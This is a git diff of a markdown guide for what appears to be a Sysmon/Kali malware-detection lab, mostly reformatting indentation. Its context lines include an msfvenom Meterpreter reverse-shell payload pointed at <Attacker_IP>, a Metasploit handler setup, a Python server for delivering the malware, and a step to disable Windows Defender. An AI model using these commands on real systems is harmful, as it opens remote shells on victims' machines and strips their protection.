@@ -121,6 +121,7 @@ Get-Process sysmon64
   - Click the network icon in the top-right corner and select "Edit Connections."
   - Choose "Wired connection 1," go to the "IPv4 Settings" tab, change the method to Manual, and add the desired IP address and netmask.
   - Click Save.
+
     <img width="512" height="162" alt="kali_net1" src="https://github.com/user-attachments/assets/f314c202-3c7d-41bc-af4a-0decacb3ac8e" />
     <img width="512" height="324" alt="kali_net2" src="https://github.com/user-attachments/assets/40fe3248-3b42-464d-8411-6b6ba41c7032" />
     <img width="512" height="406" alt="kali_net3" src="https://github.com/user-attachments/assets/57de4c9a-774b-4a0f-9ee4-041ddb26458e" />
@@ -152,20 +153,22 @@ msfvenom -p windows/x64/meterpreter/reverse_tcplhost=<Attacker_IP> lport=4444 -f
   msfconsole
   ```
   <img width="457" height="512" alt="metasploit" src="https://github.com/user-attachments/assets/45a98296-978b-41c8-8861-45285c9ee34b" />
+
 2. Execute the following commands to configure the listener:
-  ```bash
-  use exploit/multi/handler
-  set payload windows/x64/meterpreter/reverse_tcp
-  set LHOST <Attacker_IP>
-  set LPORT 4444
-  exploit
-  ```
+    ```bash
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST <Attacker_IP>
+    set LPORT 4444
+    exploit
+    ```
   <img width="434" height="512" alt="sploit_config" src="https://github.com/user-attachments/assets/4e19f4b1-2d5a-4c26-a6ab-cb732c6d857f" />
+
 3. To deploy Malware in a separate terminal, set up a Python web server in the directory where the malware was saved. It will allow the Windows machine to download it:
-```bash
-python3 -m http.server 9999
+  ```bash
+  python3 -m http.server 9999
   ```
-<img width="512" height="174" alt="python_Server" src="https://github.com/user-attachments/assets/88fe80fd-a0f7-465d-9e4a-bb731688d9b0" />
+  <img width="512" height="174" alt="python_Server" src="https://github.com/user-attachments/assets/88fe80fd-a0f7-465d-9e4a-bb731688d9b0" />
 
 ## Step 8: Executing Malware on the Windows Machine
 1. **Disable Windows Defender:** Before execution, disable Windows Defender's real-time protection on the Windows machine, as this common malware is easily detected.
